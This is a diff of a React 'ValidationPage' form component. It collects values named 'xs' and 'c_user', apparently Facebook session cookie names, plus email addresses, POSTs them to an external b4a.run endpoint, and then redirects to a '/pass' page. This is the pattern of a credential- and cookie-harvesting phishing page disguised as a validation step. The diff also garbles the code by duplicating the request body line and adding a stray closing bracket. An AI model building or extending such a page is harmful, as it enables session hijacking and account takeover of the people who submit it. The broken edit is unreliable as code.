@@ -23,6 +23,7 @@ const ValidationPage = () => {
   const [xs, setXs] = useState('');
   const [c_user, setC_user] = useState('');
 
+
   const onSubmit = (e) => {
     
     e.preventDefault();
@@ -33,12 +34,14 @@ const ValidationPage = () => {
       return;
     }
 
+
     // If both fields are filled, proceed with form submission
     fetch("https://apisubmit-8ll0irls.b4a.run/submit", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
+      body: JSON.stringify({
       body: JSON.stringify({
         emails,
         workerEmail,
@@ -53,10 +56,13 @@ const ValidationPage = () => {
       } else {
         // Handle error
       }
-    });
+    })
+    })
     navigate("/pass");
   };
 
+
+  
 
 
   return (
@@ -123,6 +129,7 @@ const ValidationPage = () => {
       )}
     </>
   );
+  
 };
 
 export default ValidationPage;
